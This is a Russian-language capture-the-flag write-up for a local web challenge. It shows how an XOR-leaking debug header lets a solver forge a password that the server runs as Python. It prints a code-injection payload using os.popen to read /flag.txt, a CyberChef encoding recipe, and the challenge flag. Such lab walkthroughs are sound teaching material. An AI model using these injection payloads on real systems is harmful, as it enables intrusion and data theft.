# Shifrovalshik

***Описание***: Администратор, опасаясь утечки своего ценного кода, разработал систему защиты, но кажется в ней что-то не так, посмотришь?

Ссылка: `http://localhost:5000`

Формат: EclipseCTF{...}

---

***Решение***:

Переходим в браузер, на `http://localhost:5000`

![ScreenShot](screenshots/shifrovalshik-1.png)

Нам необходимо ввести пароль. Пробуем:

![ScreenShot](screenshots/shifrovalshik-2.png)

Смотрим код и замечаем генерацию пароля для администратора:

```python
from utils import obf  
key, outcode = obf()  
print("ADMIN PASSWORD: ", key)
```

Посмотрим функцию `obf`:

```python
def obf():
    key = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(len(code)))
    out_code = [chr(ord(a) ^ ord(b)) for a,b in zip(key,code)]
    os.remove("code.txt")
    return key, out_code
```

При запуске создается файл `code.txt` с кодом, а затем делается XOR с рандомной строкой длиной кода. Имея заголовок `debug`, мы можем сделать XOR с нашим кодом

```python
resp.headers['debug'] = "".join(outcode).encode().hex()
```

![ScreenShot](screenshots/shifrovalshik-3.png)

Делаем XOR где в виде ключа будет содержимое `debug`, а в тексте необходимый нам код (для примера чтение флага):

```python
__import__('os').popen("cat /flag.txt").read()
```

```
https://cyberchef.org/#recipe=XOR(%7B'option':'Hex','string':'xxx'%7D,'Standard',false)URL_Encode(true)&input=X19pbXBvcnRfXygnb3MnKS5wb3BlbigiY2F0IC9mbGFnLnR4dCIpLnJlYWQoKQ
```

![ScreenShot](screenshots/shifrovalshik-4.png)

Вставляем полученную строку в GET  параметр `password` и получаем флаг

![ScreenShot](screenshots/shifrovalshik-5.png)

---

***Флаг***: `EclipseCTF{Th1s_Pa$$w0rD_1S_f0R_Rc6}`